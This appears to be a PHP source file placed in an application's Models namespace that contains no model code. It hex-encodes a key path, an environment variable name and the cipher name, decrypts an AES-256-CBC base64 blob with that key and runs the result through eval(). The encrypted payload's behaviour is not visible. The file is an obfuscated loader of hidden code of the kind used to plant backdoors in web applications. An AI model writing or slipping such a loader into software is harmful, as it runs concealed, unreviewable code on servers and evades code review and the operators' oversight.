<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('558QNHs+nI68e3l0NSrUPg==');

$c=base64_decode(

'+SMCb9DfJ0EDmOIl8RPMJgeeHnDYZVk8CvjrHb3Gmsq2MBFjhvOViyM7AicmmkumMMttgZfdu3VR' .
'hLF+/Y91/ZpdWTJxJS0gm+b9iyQCpahOvA1rRm3VoxyPHCY24xvAFK9X4Oga0suLAA27hKITgUUr' .
'9PSYrJbmghnM1by9wgAc6XknZC7qP30FIVJ8IPiQLG24gmE10B3lWkrmh2QZxRKaH29edHTd8DO3' .
'zpbsDaweZouB3OtuxPn1Err/Y1GN4XXPqP757ofAVpc4Mf6frDa8KPeH7i/IYWXODpM4LV9aqJ6H' .
'SSOtoclJdZuPPhGaNzGdDJCrQFoAjk4jwhqQtOpGkrGec/GiMvcdRtdXr31Ham4tXoCwuOz4yF+i' .
'mWHNapZ9JRFh/Pj+wAQIC58ZNddZYCVdC78738Qw5M3cQu163ukxcmlKFPBNIglVgQFbZUrvl266' .
'/dniCRt3B7zVkguSqgQABNmc863z739ePSHY8z+ZwStRujxEgEJUCczOV1wevm9aRTP4pwDMmCHK' .
'eylS1lPSLKoh5saQKbIqW3aCYNDWSxURBy6m8AoXYtl3m6SVLCoXXX6Ixw4D0Lmifv1Q9rpLDZjI' .
'eFphNR7u0Z9MwCeHlrMJeL7ydPEbQ6oVimc3jWTgZ7+HVlr5bOEoQLaPcrUaFT8zGIgMVur4HnUT' .
'Wrx8GrnvBmrj/RbiWJ87xtC6vKSIWhw9QKGnHaQGslEgJoImvodcVUpSK+LuOl5uqaH5FTkQCHGf' .
'WI4GgAhOZtCbaFbbbTWlD39Q3TvmmyPpFx2eoV769BYk7cFHeQaU3maL1rPHYEfKn7XgPu2c/z/Q' .
'uEPjpQ2ZC4QpujGjTesskB+eCzw7+H6Ec65goWCi6MSfSIxI4EF0yXF5cwQ/7Q3VFLOnzZqrjxpf' .
'q7ymSA=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

